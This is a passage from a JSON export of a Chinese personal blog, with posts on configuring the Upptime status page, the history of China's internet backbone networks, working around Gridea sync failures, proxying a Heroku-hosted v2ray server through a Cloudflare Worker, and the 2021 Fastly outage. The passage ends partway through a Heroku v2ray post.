Token 点击自己的Profile picture &gt; Settings 点击左侧的Developer settings &gt; Personal access tokens &gt; Generate new token 新增token Note: upptime Select scopes:勾选repo和workflow 点击 Generate token 复制token 返回repo &gt;Settings 点击左侧Secrets&gt; Add a new secret &gt; New repository secret 设定repo 的token Name: GH_PAT Value: 贴上刚刚复制的 token 点击 Add secret 更新YAML文件 Upptime使用.yml来做“集中式设置”，只要更改这个文件的设置，所有相关代码就会一起修改。 到你的repo，点击Code &gt; .upptimerc.yml 点击铅笔按钮编辑文件 按照以下模版修改此文件：(方括号内是需要修改的内容，修改完之后请删除方括号) #你的GitHub username owner: 【GitHub username】 #你的GitHub repo name repo: 【repo name】 #加入要监控的网站名称与URL ,可以添加多个网站 sites: - name: 【网站名称】 url: 【URL】 #没有域名的按照以下模版填写 status-website: #cname: demo.upptime.js.org (移除) baseUrl: /upptime #有域名的按照以下模版填写 status-website: cname: 【你的域名】 #自定义状态页面的navbar名称与链接 navbar: - title: 【名称】 href: 【链接】 查看GitHub Actions 设定好.upptimerc.yml后，Actions就会自动开始运行(黄圈在转)。运行成功会显示绿色的勾，运行失败会显示红色的叉。 如果发现Actions没运行，或是想要让它马上执行，就点击左侧的Setup CI&gt; Run workflow &gt; Run workflow 查看Status Website 你的状态页面URL是:https://【user_name】.github.io/【repo_name】/ 或是可以到repo &gt; Settings &gt; GitHub Pages查看URL 点击URL后，我们来到了状态页面，页面分成三个区块。 Active Incidents 显示目前的异常事件，Past Incidents 显示过去的异常事件，Live Status 可以切换五种response time 图形。 进阶操作 自定义运行时间 Upptime有七个Workflows，只要把下面这段粘贴到.upptimerc.yml，就可以自定义Workflow的时间点 workflowSchedule: graphs: &quot;0 0 * * *&quot; responseTime: &quot;0 23 * * *&quot; staticSite: &quot;0 1 * * *&quot; summary: &quot;0 0 * * *&quot; updateTemplate: &quot;0 0 * * *&quot; updates: &quot; 0 3 * * *&quot; uptime: &quot;*/5 * * * *&quot; 自定义状态页面 Status Website预设是英文的，如果你想要改成其他语言，可以把要修改的部分粘贴到.upptimerc.yml 例如： i18n: activeIncidents: 活动事件 allSystemsOperational: 所有系统都可以正常运行 incidentReport: &quot;事件 #$NUMBER 报告 →&quot; activeIncidentSummary: 在 $DATE 打开，有 $POSTS 个帖子 incidentTitle: 事件 $NUMBER 的详细信息 incidentDetails: 事件详细信息 incidentFixed: 已修复 incidentOngoing: 正在进行 incidentOpenedAt: 开始于 incidentClosedAt: 结束于 incidentSubscribe: 订阅更新 incidentViewOnGitHub: 在 GitHub 上查看 incidentCommentSummary: 由 $AUTHOR 在 $DATE 发布 incidentBack: ← 返回所有事件 pastIncidents: 过去的事件 pastIncidentsResolved: $POSTS 个问题在 $MINUTES 分钟内得到解决 liveStatus: 实时状态 overallUptime: &quot;总体正常运行时间： $UPTIME&quot; overallUptimeTitle: 总体正常运行时间 averageResponseTime: &quot;平均响应时间: $TIMEms&quot; averageResponseTimeTitle: 平均响应时间 sevelDayResponseTime: 7 天响应时间 responseTimeMs: 响应时间（毫秒） ms: 毫秒 loading: 加载中 navGitHub: GitHub footer: gd1214b保留所有权利。 Copyright © 2021 gd1214b. All Rights Reserved. rateLimitExceededTitle: 超出速率限制 rateLimitExceededIntro: 您已超过一小时内可以执行的请求数，因此您必须等待才能再次访问此网站。或者，您可以添加 GitHub 个人访问令牌以继续使用本网站。 rateLimitExceededWhatDoesErrorMean: 这个错误是什么意思？本网站使用 GitHub API 访问有关我们网站状态的实时数据。默认情况下，GitHub 允许每个 IP 地址每小时 60 个请求，您已经消耗了这些请求。 rateLimitExceededErrorHowCanFix: 我该如何解决？ rateLimitExceededErrorFix: 您可以再等一个小时，您的 IP 地址限制将恢复。或者，您可以添加您的 GitHub 个人访问令牌，这将为您提供每小时额外 5,000 个请求。 rateLimitExceededGeneratePAT: 了解如何生成个人访问令牌 rateLimitExceededHasSet: 您有一个个人访问令牌集。 rateLimitExceededRemoveToken: 删除令牌 rateLimitExceededGitHubPAT: GitHub 个人访问令牌 rateLimitExceededCopyPastePAT: 复制并粘贴您的令牌 rateLimitExceededSaveToken: 保存令牌 errorTitle: 发生错误 errorIntro: 尝试获取最新状态详细信息时出错。 errorText: 您可以稍后再试。 errorHome: 转到主页 pastScheduledMaintenance: 过去的预定维护 scheduledMaintenance: 定期维护 scheduledMaintenanceSummaryStarted: 从 $DATE 开始，持续 $DURATION 分钟 scheduledMaintenanceSummaryStarts: 从 $DATE 开始，持续 $DURATION 分钟 startedAt: 开始在 startsAt: 开始于 duration: 持续时间 durationMin: $DURATION 分钟 incidentCompleted: 已完成 incidentScheduled: 已预定 url: &quot;链接&quot; status: &quot;状态&quot; history: &quot;历史&quot; responseTime: &quot;响应时间&quot; uptime: &quot;正常运行时间&quot; up: &quot;🟩 正常运行&quot; degraded: &quot;🟨 运行缓慢&quot; down: &quot;🟥 停机&quot; responseTimeGraphAlt: &quot;响应时间图像&quot; responseTimeDay: &quot;24 小时响应时间&quot; responseTimeWeek: &quot;7 天正常运行时间&quot; responseTimeMonth: &quot;30天的正常运行时间&quot; responseTimeYear: &quot;1年的正常运行时间&quot; uptimeDay: &quot;24 小时正常运行时间&quot; uptimeWeek: &quot;7 天正常运行时间&quot; uptimeMonth: &quot;30天的正常运行时间&quot; uptimeYear: &quot;1年的正常运行时间&quot; liveStatusHtmlComment: &quot;&lt;！ -实时状态- &gt;&quot; degradedPerformance: &quot;🟨 性能降低&quot; completeOutage: &quot;🟥 全部停机&quot; partialOutage: &quot;🟧 部分停机&quot; 参考资料 AnnKuoQ Blog Getting started | Upptime upptime - GitHub ","link":"https://blog.gd1214b.icu/post/G9dquz6bG/"},{"title":"大话中国骨干网","content":" 本文转自:https://m.ithome.com/html/523947.htm 987 年 9 月 20 日，北京中国兵器工业计算机应用研究所的钱天白教授，发出了我国第一封电子邮件，内容是： “Across the Great Wall we can reach every corner in the world. ”（“越过长城，我们能到达世界的每个角落。” ） 这封邮件当时具有极为深远的意义，它被视为中国与互联网的第一次 “亲密接触”。而钱天白教授，也被世人称为 “中国互联网之父”。 其实，当时钱天白所使用的网络，并不是我国自主建设的 Internet 骨干网，而是 1986 年计算机应用技术研究所与德国卡尔斯鲁厄大学合作建设的一个国际联网项目——中国学术网（Chinese Academic Network，简称 CANET）。 这封邮件的传输路径，也颇为曲折。邮件发出之后，首先通过意大利公用分组网 ITAPAC 设在北京侧的 PAD 机，跨过半个地球，进入意大利本土的 ITAPAC 主网。然后，再进入德国的 DATEX―P 分组网。最终，到达卡尔斯鲁厄大学。当时，这条线路的速率，仅仅只有 300bps。 不管怎么说，这封邮件还是拉开了中国互联网时代的序幕。此后，越来越多的国内高校和科研院所，开始加入到互联网的研究中，并尝试组建更大规模的计算机网络。 技术探索 1988 年初，中国邮电部正式建成了国内第一个 X.25 分组交换网——CNPAC，覆盖了北京、上海、广州、沈阳、西安、武汉、成都、南京、深圳等城市。 同年，中科院高能物理研究所采用 X.25 协议，将该单位的 DECnet（DEC 公司推出的一种小型机网络）与西欧中心的 DECnet 进行连接，实现了计算机国际远程连网，还实现了与欧洲和北美地区的电子邮件通信。 12 月，清华大学校园网采用胡道元教授从加拿大 UBC 大学引进的电子邮件软件包（采用 X.400 协议），通过 X.25 网与加拿大 UBC 大学相连，开通了电子邮件应用。 1989 年 5 月，中国研究网（CRN）通过当时邮电部的 CNPAC，实现了与德国研究网（DFN）的互连。借助 DFN 的网关，CRN 可以与 Internet 沟通。 1991 年，中科院高能物理研究所采用 DECNET 协议，以 X. 25 方式连入美国斯坦福线性加速器中心（SLAC）的 LIVEMORE 实验室，开通了电子邮件应用。 一个又一个连接的建立，振奋了国人。然而，这些连接都只能算是 “Internet 间接连接”或者 “单功能（邮件）连接”，并不是真正的 “完整 Internet 直接连接”。后来，学术界和政府层面很快开始了建立完整直接连接的尝试。 1989 年 10 月，中关村地区教育与科研示范网络项目正式启动。该项目由世界银行提供贷款，国家计委（国家计划委员会）、国家教委（国家教育委员会）、中国科学院、国家自然科学基金会共同参与投资和支持。世界银行将其命名为 “National Computing and Networking Facility of China”，也就是 NCFC。 1992 年底，NCFC 完成了三个院校网（中科院院网 CASNET、清华大学校园网 TUNET、北京大学校园网 PUNET）的建设。一年后，NCFC 主干网工程完工，采用高速光缆和路由器实现了三个院校网相互联通。 接下来，NCFC 的目标，就是直接连入 Internet。 阻力重重 众所周知，Internet 源于美国，虽然叫做国际互联网，但实际上当时处于美国的控制之下。中国想要真正连入 Internet，必须得到美国方面的同意。 中美双方的学术界人士，对于中国连入 Internet 这件事是非常积极的。 1991 年 10 月，在中美高能物理年会上，美方发言人怀特 · 托基提出，中国应该尽快接入 Internet。 1992 年 6 月，在日本神户举行的 INET'92 年会上，中国科学院钱华林研究员约见美国国家科学基金会国际联网部负责人，第一次正式提出，希望能够连入 Internet。 钱华林 结果，中方提出的请求，遭到来自美国政界的反对。之所以反对，是因为他们认为，来自社会主义阵营的中国，会利用 Internet 偷取美国的信息和技术研究成果。 经过反复的谈判和沟通，美方勉强同意，可以先建立一根专线连接。美国对这根专线提出了苛刻的要求：1、只能连入能源科学网（ESNET）；2、不得散布病毒；3、不得用于军事和商业领域。 为了长远考虑，中方接受了这些条件。1993 年 3 月 2 日，中科院高能物理研究所接入美国斯坦福线性加速器中心（SLAC）的 64K 专线正式开通，成为中国 “部分连入 Internet”的第一根专线。 1993 年 6 月，NCFC 专家们在 INET'93 年会上，利用各种机会重申了中国 “全功能连入 Internet”的要求，获得大部分到会人员的支持，极大地推动了项目的进展。 1994 年 4 月初，中美科技合作联委会在美国华盛顿举行。会前，中科院副院长胡启恒代表中方向美国国家科学基金会（NSF）重申连入 Internet 的要求，得到美方的认可。至此，所有的阻碍都被消除。 胡启恒 1994 年 4 月 20 日，NCFC 接入 Internet 的 64K 国际卫星专线正式开通（通过美国 Sprint 公司），实现了与 Internet 的全功能连接。 从这一天起，中国正式迈入互联网世界的大门，被国际上承认为真正拥有全功能 Internet 的第 77 个国家。 一个月后，5 月 21 日，中科院计算机网络信息中心完成了中国国家顶级域名（CN）服务器的设置，改变了中国的 CN 顶级域名服务器一直放在国外的历史。（中国顶级域名 CN 由钱天白教授于 1990 年 11 月 28 日代表中国正式在 SRI-NIC 正式注册登记。） NCFC 连入 Internet 之后，中科院对它进行了进一步的扩建。 1995 年 4 月，中科院启动京外单位联网工程（简称 “百所联网”工程），目标是在北京地区已经入网的 30 多个研究所的基础上把网络扩展到全国 24 个城市，实现国内各学术机构的计算机互联，并与 Internet 互联。 1996 年 2 月，中科院做出决定，将以 NCFC 为基础发展起来的这个互联网络，正式改名为 “中国科技网（CSTNet）”。 四大 IP 骨干网 1994 年 9 月，就在中国迈入互联网世界后不久，邮电部电信总局与美国商务部签订协议，正式启动中国公用计算机互联网的建设。这个网，就是现在大名鼎鼎的中国第一骨干网——ChinaNet。 1995 年 1 月，根据协议约定，邮电部电信总局分别在北京、上海开通了接入美国 Internet 的 64K 专线（同样是通过美国 Sprint 公司）。北京和上海这两个节点之间，采用 2M 带宽相连。 1996 年 1 月，电信总局正式开始向全社会提供 Internet 接入服务（通过电话网、DDN 专线以及 X.25 网等方式）。这一举动，宣告了中国互联网民用化时代的开始。 由于窄带拨号接入的入网领示号为 163，因此 ChinaNet 也被称为 163 网络（和网易的 163 没有关系）。 除了中国科技网（CSTNet）和中国公用计算机互联网（ChinaNet）之外，国内当时还同步建设了中国教育和科研计算机网（CERNET）和中国金桥信息网（CHINAGBN） 中国教育和科研计算机网（CERNET） 1994 年 7 月初，由清华大学等六所高校建设的 “中国教育和科研计算机网”试验网开通，并通过 NCFC 的国际出口与 Internet 互联。 1994 年 8 月，由国家计委投资，国家教委主持的中国教育和科研计算机网（CERNET）正式立项。 1995 年 12 月，“中国教育和科研计算机网（CERNET）示范工程”建设完成。这张网，就是我们现在常说的 “教育网”（大学生读者应该比较熟悉）。 中国金桥信息网（CHINAGBN） 1993 年 3 月 12 日，朱镕基副总理主持会议，提出和部署建设国家公用经济信息通信网（简称金桥工程）。 1993 年 8 月 27 日，李鹏总理批准使用 300 万美元总理预备费，支持启动金桥前期工程建设。 1994 年 6 月 8 日，金桥前期工程建设全面展开。1995 年 8 月，金桥工程初步建成，在 24 省市开通联网（卫星网），并与国际网络实现互联。 1996 年 9 月 6 日，中国金桥信息网（CHINAGBN）连入美国的 256K 专线正式开通。中国金桥信息网宣布开始提供 Internet 服务，主要提供专线集团用户的接入和个人用户的单点上网服务。 最终，国内形成了四大骨干网的格局。正是这些网络，支撑起了中国互联网的起步。 1997 年 12 月，四大骨干网实现互联互通。此后，中国的互联网，进入了崭新的时代！ 中国电信 上面我们提到，中国邮电部在 1995 年建立了 ChinaNet（中国公用计算机互联网），也就是大家俗称的 163 网。 这张网，当时是国内普通网民接入互联网的主要通道。 因为当时中国邮电还没有实行 “邮电分营”，所以这张网是邮电部电信总局负责建设和维护。 1997 年，邮电部实施 “邮电分营”，这张网的责任主体，变成了 “中国电信”（老电信）。 同年，中国电信各省公司开始独立建设省内 IP 骨干网（省网）。建成之后，整个 ChinaNet 分为骨干网、省网和城域网三级结构。其中，骨干网分为核心层、汇聚层两层。 某省组网范例 1998 年 7 月，ChinaNet 骨干网第二阶段建设开始。八个大区域的骨干带宽被扩展到 155M，且所有节点路由器被替换为千兆路由器。 到了 2000 年的下半年，中国电信借助 DWDM（波分复用）和千兆路由器技术，再次对 ChinaNet 进行大规模升级和扩容。网络节点间的路由中继，由 155M 提升到 2.5Gbps，提速 16 倍。 截至到 2000 年底，ChinaNet 在国内总带宽已达到 800Gbps。2001 年 3 月，ChinaNet 的国际出口总带宽突破 3Gbps。 从 2002 年开始，ChinaNet 逐步进入 10G 时代。ChinaNet 的数据传输能力，达到国际先进水平。 2003 年，ChinaNet 进行优化整合，推行扁平化，取消省网，网络结构调整为骨干网和城域网两级。 与此同时，中国电信启动了多厂商 MSTP（多业务传送平台）的互通测试，推动 TDM 向以太网的转型。 再后来的故事，大家应该都比较熟悉了，就是往 OTN 和单波大容量演进，朝着 40G、100G（2015 年）的方向发展。 目前的骨干网，正在逐步普及单波 400G。如果按 60 波算，单光纤的传输容量能达到 20T 以上。 除了容量之外，就是 OXC 全光交叉、IPv6、SRv6、SDN 等新技术的引入、改造和普及，此前小枣君都做过详细的介绍。 接下来，我们再深入了解一下 ChinaNet 的整体情况。 一般来说，运营商的骨干网架构和技术细节属于秘密信息，不对外公开。但是，如今在互联网上，这些信息基本上都能查到。我就基于能公开查到的信息，大致介绍一下（可能有所变动，仅供参考）。 从架构来说，ChinaNet 分为骨干网和城域网（前面有说，干掉了省网），骨干网又分核心层、汇聚层和接入层。 北京、上海、广州，是 ChinaNet 的超级核心。除了超级核心之外，ChinaNet 还有天津、西安、南京、杭州、武汉、成都等普通核心。所有核心之间，采用 Full-Mesh 连接。国际出入口，以及运营商之间的互联互通，基本上都在核心层。 找到一张老图，仅供参考 汇聚层一般都在各省省会或第二大城市，采用双方向互联，分别连到一个超级核心和一个普通核心，有的省份会三方向互联。 接入层，就是汇聚层到各个地市城域网。 除了 ChinaNet 之外，中国电信还有一张非常重要的骨干网——CN2。 2004 年左右，为了满足高品质业务的需求，中国电信启动了 CN2 网络的招标建设。 CN2，全称 Chinatelecom Next Carrier Network（中国电信下一代承载网络），简称 CNCN，又称 CN2，刚好符合它作为中国电信第二张承载网的身份。 中国电信将 CN2 定位为 “精品网络项目”，非常有前瞻性。后来的事实证明，CN2 在抢占政企高端市场方面，确实发挥了重要作用。 CN2 的基本建网特点，就是扁平化、大容量和轻载运行。建网初期的核心技术，是 IP/MPLS。 从架构上来看，CN2 和 ChinaNet 有很大区别。CN2 一共是 7 个核心节点，分别是北京、上海、广州、南京、武汉、西安、成都。 同样是一张老图，供参考 此外，CN2 还在香港、新加坡、东京、伦敦、法兰克福等国际大城市设立了 POP 节点，提供国际 Internet 接入和网间互联业务。 CN2 作为高端网络，面向客户的时候，也进行了进一步的产品等级划分，例如 CN2 GT、CN2 GIA。 CN2 GT：GT 是 Global Transit 的简称，是 CN2 中的中端产品，在 CN2 里的等级比较低，但是相比于传统 163 骨干网依然有不少的提升。 CN2 GIA：GIA 是 Global Internet Access 的简称，是目前 CN2 中的最高端的产品，在 CN2 中的等级最高，线路表现最好、最稳定，价格也是最高。 2015 年，中国电信为了加强数据中心之间的节点互联，满足云服务日益增长的需求，还启动建设了 “第三张”全国骨干网——CN2-DCI（Data Center Interconnection）。关于这张网，网上目前公开的信息极少。 以上就是中国电信 IP 骨干网的大致情况。 中国联通 接下来，我们再看看中国联通的骨干网。 1994 年 7 月 19 日，中国联通经国务院批准，正式挂牌成立，主要经营 GSM 移动通信业务。 随着 2G 向 3G 的演进，有了 GPRS 数据业务，中国联通也建设了 UNINET 骨干网，作为自家 GPRS 网络的接入点，也是面向全国提供互联网服务的载体。 因为 UNINET 的拨号上网接入号码为 “165”，所以这个网也被称为 165 网。 1999 年 10 月 22 日，中国网通（小网通、老网通）由中科院、广电总局、铁道部、上海市政府四方出资成立，在全国 17 个城市开通互联网服务。 网通也建设了一张自己的骨干网，就是 “中国网通公用互联网”（CNCNET）。 此外，邮电部当年除了 163 网之外，在 1997 年还建设了一张中国公众多媒体通信网。这张网络很特别，完全独立于 163 网，采用私有地址 10.0.0.0/8，只能国内互相访问，相当于是一张 “国内局域网”。如果需要访问 163 网和 Internet 的话，需要找专门的代理服务器跳转。 因为这张网络的接入号码为 169，故又称 169 网。 169 网有一个很大的优势，就是价格便宜。当时 163 的使用费是每小时 10 元，而 169 只需要每小时 4 元。因此，169 受到很多普通网民的喜爱。 2002 年，国内电信行业重组，中国电信 “南北分家”。北方九省一市电信公司从原中国电信剥离，与小网通、吉通合并，成立新的中国网通（大网通、新网通）。 于是，中国网通在既有 CNCNET 的基础上，得到了中国电信从 163 网拆出来的部分精华骨干网。为了区别于中国电信的 163 网，网通带走的这个网被称为 “CHINA169”。 值得一提的是，当时吉通并入中国网通，CHINAGBN（中国金桥网）也随之并入 CHINA169 中。 2008 年，中国电信业再次重组，中国联通和中国网通合并，变成新的中国联通。 新的中国联通，自然而然地接管了 CHINA169。 此外，网通最初的骨干网 CNCNET（主要承载原网通 NGN 软交换、DCN 等业务）也交给联通运营。这个 CNCNET（自治域为 AS9929，经常被称为 9929 网络）保持相对独立，后来被称为 “联通 A 网”。 与之相对应的 “联通 B 网”，就是原联通建设的 IP 承载网，主要承载 2G/3G 移动网业务的那个网。后来好像逐渐没用了，业务迁到了 A 网。 2018 年，联通将 IP 承载 A 网改名为 CUII，中国联通工业（产业）互联网。CUII 的定位有点像中国电信的 CN2，主要提供国际和国内跨地市 MPLS-VPN 和大客户互联网专线任务的承载，常用于企业宽带和 IDC，极少用于家用宽带。 总之，联通主要就是 “China169+CUII”的双网格局。 由于历史原因，联通 China169 的网络流量存在较大的南北差异，北方 10 省的业务流量明显大于南方。 早期的时候，China169 全网分为四个大区，分别是北方大区、华东大区、南方大区、西部大区。设置了北京 1、北京 2、上海、广州四个核心节点，并将陕西、四川、山东、辽宁设为区域核心节点。 中国移动 再来说说中国移动。 中国移动的骨干网发展史没有电信和联通那么复杂，这家公司本身的历史就很简单。 2000 年 4 月 20 日，中国移动正式成立，5 月 16 日挂牌。 中移成立初期，也是主要以移动语音业务为主。后来，随着业务的发展，才逐步建设了较为完整的 IP 骨干网，名为 CMNET（China Mobile Network，中国移动互联网），自治域为 AS9808，也称 9808 网络。 当时，CMNET 是中国移动 GPRS 网络的两大接入点（另一个是 CMWAP）之一。通过 CMNET 接入点，中国移动手机用户可以接入 CMNET 网络，访问 Internet。 虽然 CMNET 起步比较晚（相对来说），但发展速度非常快。尤其是这些年中国移动拼命拓展固网宽带业务，流量增长迅猛，扩容招标也是非常频繁。 CMNET 为骨干网和省网两级自治域、多层结构。骨干网分为核心层、汇聚层和接入层。 北京、上海、广州 3 个节点为核心节点，它们与相连链路共同构成骨干核心层。骨干核心层提供大区内省份流量的交换，并负责全网与国际 Internet、国内其他运营商的互联。 汇聚层负责汇接各省到骨干网的连接。南京、武汉、成都、西安、沈阳等节点为汇聚节点，负责本大区内省份流量之间的交换。 接入层负责汇聚本省省际流量和出网流量。接入节点一般双上联核心节点，部分流量较大的省份，会采用多上联。 国内和国际网间互联方面，节点都设置在北京、上海、广州。 除了 CMNET 之外，中国移动还有 IP 专用承载网，简称 IP 专网。当时建设这个网的主要目的，是为了承载高价值客户业务，如话音，流媒体，信令，网管，大型客户的 VPN 等业务。 IP 专网为三层结构，分别为核心、汇聚和接入三层，采用单一自治域，目前已经延伸到国内 330 多个主要地市。大致架构如下： 中国广电 最后再说说新入坑的中国广电吧。 2018 年，中国广电的广电宽带获批骨干网运营资质，启动全国骨干网建设，并将其命名为 CBNNET。 CBNNET 的主要建设单位，是中国广电的子公司中国有线。 2019 年，广电骨干网已经与中国电信的骨干网进行了互联互通。 按照规划，CBNNET 将是一张 “五纵五横”的全国性 IP 骨干网，全网 100G OTN 起步，部分关键链路 400G/1T OTN。 未来，CBNNET 将采用三层架构，即国干层、省网 / 接入层、互联层，覆盖 337 个地市，逐步形成双平面网络，直接提供宽带出口，互联网总出口带宽将达到 5T。 结语 好啦，以上就是目前国内运营商骨干网的大致情况。简单画个表，如下： 值得一提的是，包括中移在内的运营商，针对现有骨干网容量不足的情况，普遍建设了所谓的 “第二平面”。“第二平面”属于扩容，并不是新建独立的第二张网络。 除了上述骨干网之外，我们国家还有几张针对特定用户的骨干网，分别如下： ","link":"https://blog.gd1214b.icu/post/yZTkyJpRj/"},{"title":"解决Gridea同步失败的问题","content":"前言 由于众所周知的原因，GitHub在中国大陆地区受到的干扰严重，大部分情况下根本无法连接，这也导致Gridea的同步失败问题。 解决方案 通常的解决方案是通过代理服务器连接，但由于大部分的代理软件（如v2rayN等），只能更改系统的代理设置，，像Gridea这些不遵守系统代理设置的软件，无法通过代理服务器连接。 下面介绍一种本人亲测有效的方法, 这种方法的基本原理是用GitHub Desktop将Gridea生成的网页源代码手动push到GitHub上。 第一步 连接上代理 这一步不做过多讲解。 第二步 下载并安装GitHub Desktop 下载地址： https://central.GitHub.com/deployments/desktop/desktop/latest/win32 打开安装程序即可自动完成安装。 第三步 登陆GitHub账号 点击 Sign into GitHub.com 在浏览器里登陆你的GitHub账号 第四步 清空Gridea 配置目录下ouput文件夹里的所有内容 需要清空ouput文件夹里的所有内容的原因是GitHub Desktop无法克隆仓库到非空文件夹中，这一步不会影响你的博客数据。 注意output文件夹不要删除 第五步 在GitHub Desktop中克隆你的博客仓库 注意目录要选择Gridea 配置目录下ouput文件夹 第六步 同步Gridea 在Gridea中依次点击 远程 &gt; 检测远程连接 &gt; 同步 这一步无所谓是否同步成功. 第七步 同步到GitHub上 在GitHub Desktop 中点击 Pushu origin 等候完成即可。 根据评论区中某匿名网友的提醒，有change files的话需要先点击左下角的Commit，才会出现第七步截图里的push origin。 其他说明 此时你的博客应该已经同步到GitHub上了，如果有任何问题，欢迎在下方的评论区中提出。 ","link":"https://blog.gd1214b.icu/post/F2_C5EVQh/"},{"title":"使用Cloudflare自选IP加速Heroku-v2ray","content":" 请先阅读本站的免责声明:https://blog.gd1214b.icu/post/disclaimers/ 请遵循当地法律使用，如您有违反当地法律造成的责任，本站拒不承担. 前言 在上一篇文章中,我们介绍了在Heroku上部署v2ray的方法。但在中国大陆直连Heroku服务器的速度不是很快，因此我们使用Cloudflare的自选IP来加速连接。 配置CloudFlare反向代理 1. 首先登陆CloudFlare官网，然后点击 右侧的 Workers. 2. 接着点击创建Workers 3. 接着复制下方代码，并添加进去.注意把下面的中文替换成你的Heroku应用名称 addEventListener( &quot;fetch&quot;,event =&gt; { let url=new URL(event.request.url); url.hostname=&quot;你的heroku应用名称.herokuapp.com&quot;; let request=new Request(url,event.request); event. respondWith( fetch(request) ) } ) 使用Cloudflare自选IP 前往下面这个网站下载程序： https://github.com/XIU2/CloudflareSpeedTest/releases 解压之后打开这个程序: 这个程序会对Cloudflare的所有IP进行测速，这可能会需要几分钟的时间。 测速结果会保存在应用程序目录下的result.csv文件中 在里面找到延迟最低的IP地址（一般在第一行），把它复制下来，等会会用到。 配置V2Ray 打开你的v2ray客户端，添加vmess服务器，按照下面的图填写 除了中文部分以外严格按照图上内容填写。 然后保存，就可以愉快地使用v2ray了 如果你遇到了任何问题 欢迎在下方的评论区中提出。 其他说明 如果优选IP无法连接，请在地址一栏填写以下域名： 电信填：www.digitalocean.com 移动填：cf.000714.xyz 其他运营商请大家自行Google ","link":"https://blog.gd1214b.icu/post/P9MODAcdP/"},{"title":"搞瘫全球大半个互联网，Fastly是何方神圣？","content":" 本文转自:https://new.qq.com/omn/20210609/20210609A01G7M00.html 人们习以为常的互联网服务，已经成为现代生活必备的基础设施，但在背后网络云服务商集中度不断提升的情况下，其脆弱性也愈发突出。8日全球互联网世界碰到的一次不大不小的“断网”事件，就是这一脆弱性的最新例证。 全世界数以亿计互联网用户在当天发现自己无法打开日常访问的网站，在经过约1小时后才逐渐恢复。最终，一家名为Fastly的CDN（content delivery network）服务提供商浮出水面，这家公司表示，由于进行了一项“服务配置”的修改，引发了大规模故障。 有意思的是，当人们得知问题出自Fastly这家公司后，其股价在当天出现大涨，因为通过这起事件，投资者意识到，这家总部位于旧金山，员工数不到1000人的“边缘计算云服务”公司，对互联网世界有着举足轻重的影响力。 宣称在互联网终端用户和服务器之间架设“中继站”，为用户提供更快捷、便利的互联网内容体验的同时，由于这一类服务商集中度过高，导致了类似当天大范围用户无法打开网页这样的风险隐患。 “服务配置”修改搞瘫大半个互联网 本周二，当全球各地数以亿计的互联网用户登陆自己平日经常登陆的网站时，发现页面无法打开，并出现了“503 Errors”的错误提示，包括亚马逊、Reddit、Twitch、Pinterest以及包括纽约时报、CNN等在内的多数新闻网站均悉数中招。 这一问题大约持续了一个小时，初步的调查结果显示，互联网内容传递服务公司Fastly是引起这一场互联网大规模掉线的主要原因。 从Fastly发布的状态更新报告可以追踪事件的整个进展过程，大约在美国太平洋时间8日凌晨2:58分，Fastly称，“我们目前正在调查对我们的内容传递网络服务（Content Delivery Network）带来潜在影响的冲击。” 在这则报告发布后不久，推特上便出现了许多用户声称无法打开BBC、CNN、纽约时报等新闻网站的推文。社交平台推特本身也受到了一定程度的影响，其负责表情包的服务器无法接入，导致在出问题的时段内，许多推文的表情无法正常显示。 随后问题变得愈发严重，全球各个地区均不同程度出现网站无法打开的问题，甚至连英国政府官方网站都一度受到影响。 在大约一个小时后，Fastly再度更新状态报告，称已经找到问题并实施了修复措施，在美国太平洋时间8日凌晨4点10分，Fastly通过其官方推特称，“我们发现一个服务配置的更改引发了全球服务的短暂中断，目前已将这一配置关闭，我们全球服务网络已恢复正常。” Fastly是何方神圣？ 对于许多普通互联网用户来说，Fastly的名字或许十分陌生，这家公司创办于2011年，总部位于旧金山，从事的主要业务是互联网云服务。2017年，该公司发布了边缘云计算平台，提供将终端服务器的内容更近、更快地给到终端用户的服务。简而言之，Fastly为服务器和终端用户之间搭建了一个中继站，让用户无需再从终端服务器上下载网络内容，而由Fastly事先预载一部分内容，当用户访问相应网站时，就无需再从远端的终端服务器上下载，而从Fastly处获得，提高终端用户获得互联网内容的效率。 Fastly的这一互联网内容传递服务，能够让网页的加载速度更快、优化图片、视频和其他大尺寸的内容能够更快的在用户终端上出现。在Fastly官方网站的介绍中，该公司列举了几个例子，例如新闻网站Buzzfeed在使用了Fastly的服务后，加载速度提高了50%，纽约时报在美国大选夜能够承载200万用户登陆等。 此外，边缘云计算的另一个好处是作为一道额外的防范黑客攻击的防火墙，例如最常见的DDoS攻击等，保障终端服务器不受攻击的影响。 但同时带来的一个问题是，由于Fastly作为连接终端服务器和终端用户的桥梁，一旦这座“桥梁”发生问题，双方之间的连接也就断了，这正是8日所短暂发生的情况。 目前对于这起故障到底如何发生的有关细节还不得而知，Fastly方面也仅给出了是因为进行一项“服务配置”的调试而引发的简单解释。 一个有意思的现象是，在外界已经得知此次不得不小的“断网”事件主要责任方是Fastly的情况下，Fastly的股价在8日盘中大涨超过10%，这背后的逻辑是：通过这次事件，许多投资者发现Fastly居然服务如此多的互联网内容提供方，对互联网有着超过之前预期的影响力，尽管是一桩负面事件，但却对公司本身是一次利好。 根据Fastly 2021年第一季度财报显示，截至3月31日，服务全球58个市场，第一季度总收入8485万美元，其中6273万美元来自于美国市场，占绝大部分比例，来自亚太和欧洲市场的收入则分别为915万和964万美元。Fastly在美国以外的用户在截至3月31日为1208，约占全部用户量的53%。 从财报业绩表现来看，Fastly仍处在业务快速扩张阶段，第一季度收入同比增长34.8%，同时研发投入同比增长超过100%，导致当季净亏损5051万美元。去年全年，Fastly收入同比增速为45%，净亏损9593万美元。 Fastly在2020年同样是一支疫情受益股，股价在当年从年初的每股约20美元一路涨至年末的每股100美元以上翻了4倍多。但在进入2021年后，股价又一路从高位回落，目前距离历史高位已经腰斩。 Fastly断网事件再次提醒我们互联网服务的脆弱性，当提供互联网底层服务的单个公司出现短时故障时，将导致大规模用户的互联网服务受到影响，因为越来越多的互联网内容提供方正在依赖越来越少的类似Fastly这样的中间云服务提供商，这样的事件在近期时有发生，包括去年7月Cloudflare因故障中断服务以及亚马逊旗下AWS在去年11月碰到的短期故障等，云服务市场集中度的不断提高，正在不断加剧这样的潜在风险。 ","link":"https://blog.gd1214b.icu/post/YdM16VZBI/"},{"title":"在Heroku上部署v2ray","content":" 请先阅读本站的免责声明:https://blog.gd1214b.icu/post/disclaimers/ 请遵循当地法律使用，如您有违反当地法律造成的责任，本站拒不承担. 简介 Heroku Heroku是 Salesforce 